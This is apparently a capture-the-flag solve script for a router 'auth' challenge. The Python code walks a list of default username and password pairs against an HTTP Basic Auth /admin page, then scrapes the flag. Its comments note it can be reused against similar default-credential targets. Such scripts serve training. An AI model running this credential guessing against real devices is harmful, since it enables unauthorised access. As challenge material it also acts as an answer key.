#!/usr/bin/env python3
"""
NetGuard Router (auth, 100) — default credentials on the /admin Basic-Auth gate.

CWE-1392 (default creds) + CWE-521 (weak password). The NG-220's admin console
sits behind HTTP Basic Auth with a factory default that was never rotated.
Walk a small default-cred list, stop on the first 200, scrape the flag.

Usage:
    python3 solve.py                         # defaults to auth1.chal.deti:8060
    python3 solve.py http://auth1.chal.deti:8060
"""
import re
import sys
import requests
from requests.auth import HTTPBasicAuth

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://auth1.chal.deti:8060"
ADMIN = f"{BASE}/admin"

# Ordered most-likely first. admin:admin123 is the known answer for this box;
# the rest make the script reusable against similar default-cred targets.
CREDS = [
    ("admin", "admin123"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", ""),
    ("admin", "1234"),
    ("admin", "changeme"),
    ("root", "root"),
    ("user", "user"),
]

FLAG_RE = re.compile(r"flag\{[^}]*\}")


def main() -> int:
    for user, pw in CREDS:
        try:
            r = requests.get(ADMIN, auth=HTTPBasicAuth(user, pw), timeout=10)
        except requests.RequestException as e:
            print(f"[!] {user}:{pw} -> request failed: {e}")
            continue

        print(f"[{r.status_code}] {user}:{pw or '<blank>'}")
        if r.status_code == 200:
            print(f"[+] authenticated as {user}:{pw or '<blank>'}")
            m = FLAG_RE.search(r.text)
            if m:
                print(f"[+] FLAG: {m.group(0)}")
            else:
                print("[!] 200 but no flag{...} in body — dumping page:\n")
                print(r.text)
            return 0

    print("[-] no default credential worked")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
